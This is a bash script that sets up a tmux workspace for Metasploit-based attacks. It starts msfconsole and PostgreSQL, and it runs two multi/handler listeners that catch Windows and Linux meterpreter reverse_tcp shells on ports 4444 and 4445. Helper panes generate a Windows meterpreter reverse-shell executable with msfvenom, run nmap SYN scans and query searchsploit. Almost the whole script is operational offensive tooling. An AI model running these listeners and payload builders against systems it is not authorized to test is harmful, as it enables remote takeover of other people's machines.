#!/usr/bin/env bash
# ==============================================================================
# TMUX SESSION — Launch Metasploit + tools in organized tmux session
# Usage: bash tmux_session.sh [session_name]
# ==============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../lib/common.sh" 2>/dev/null || {
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
    log() { echo -e "${GREEN}[✓]${NC} $*"; }
    info() { echo -e "${BLUE}[*]${NC} $*"; }
    warn() { echo -e "${YELLOW}[!]${NC} $*"; }
    err() { echo -e "${RED}[✗]${NC} $*" >&2; }
}

SESSION_NAME="${1:-msf-workspace}"
MSF_INSTALL_DIR="${MSF_INSTALL_DIR:-$HOME/metasploit-framework}"
MSF_DIR="${MSF_DIR:-$HOME/.msf4}"

# ── Check tmux ────────────────────────────────────────────────────────────────
command -v tmux &>/dev/null || { err "tmux not installed"; exit 1; }

# ── Kill existing session ─────────────────────────────────────────────────────
if tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
    warn "Session '$SESSION_NAME' exists — killing"
    tmux kill-session -t "$SESSION_NAME"
fi

# ── Create Session ────────────────────────────────────────────────────────────
info "Creating tmux session: $SESSION_NAME"

# Window 0: msfconsole
tmux new-session -d -s "$SESSION_NAME" -n "msfconsole" \
    "cd '$MSF_INSTALL_DIR' && bundle exec ./msfconsole"

# Window 1: PostgreSQL
tmux new-window -t "$SESSION_NAME" -n "postgres" \
    "pg_isready -p 5432 && echo 'PG running' || pg_ctl -D '$MSF_DIR/postgres' start && tail -f '$MSF_DIR/postgres/pg.log'"

# Window 2: Listener/Handler
tmux new-window -t "$SESSION_NAME" -n "listener" \
    "cd '$MSF_INSTALL_DIR' && bundle exec ./msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j'"

# Window 3: Tools - nmap, msfvenom, etc.
tmux new-window -t "$SESSION_NAME" -n "tools" \
    "cd '$HOME' && bash"

# Window 4: Logs
tmux new-window -t "$SESSION_NAME" -n "logs" \
    "tail -f '$MSF_DIR/logs/*.log' 2>/dev/null || echo 'No logs yet'"

# Window 5: Reverse Shell Handler (multi)
tmux new-window -t "$SESSION_NAME" -n "shells" \
    "cd '$MSF_INSTALL_DIR' && bundle exec ./msfconsole -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4445; exploit -j'"

# ── Configure pane layouts ────────────────────────────────────────────────────
# Window 0: msfconsole - split for notes
tmux select-window -t "$SESSION_NAME:0"
tmux split-window -h -p 30 -t "$SESSION_NAME:0" \
    "cd '$MSF_DIR' && watch -n 5 'ls -la logs/ loot/ 2>/dev/null | head -20'"

# Window 3: Tools - split into 4 panes
tmux select-window -t "$SESSION_NAME:3"
tmux split-window -h -p 50 -t "$SESSION_NAME:3"
tmux split-window -v -p 50 -t "$SESSION_NAME:3.0"
tmux split-window -v -p 50 -t "$SESSION_NAME:3.1"

# Pane 0: Quick commands
tmux send-keys -t "$SESSION_NAME:3.0" "echo '=== QUICK COMMANDS ===' && echo 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=\$IP LPORT=4444 -f exe -o payload.exe' && echo 'nmap -sS -T4 target' && echo 'searchsploit apache' && echo '' && bash" C-m

# Pane 1: msfvenom helper
tmux send-keys -t "$SESSION_NAME:3.1" "echo '=== MSFVENOM HELPER ===' && read -p 'LHOST: ' LHOST && read -p 'LPORT [4444]: ' LPORT && LPORT=\${LPORT:-4444} && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=\$LHOST LPORT=\$LPORT -f exe -o payload.exe && ls -la payload.exe && bash" C-m

# Pane 2: nmap
tmux send-keys -t "$SESSION_NAME:3.2" "echo '=== NMAP ===' && read -p 'Target: ' TARGET && nmap -sS -T4 -A \$TARGET && bash" C-m

# Pane 3: Search
tmux send-keys -t "$SESSION_NAME:3.3" "echo '=== SEARCHSPLOIT ===' && read -p 'Search: ' TERM && searchsploit \$TERM && bash" C-m

# ── Select main window and attach ─────────────────────────────────────────────
tmux select-window -t "$SESSION_NAME:0"
tmux attach-session -t "$SESSION_NAME"
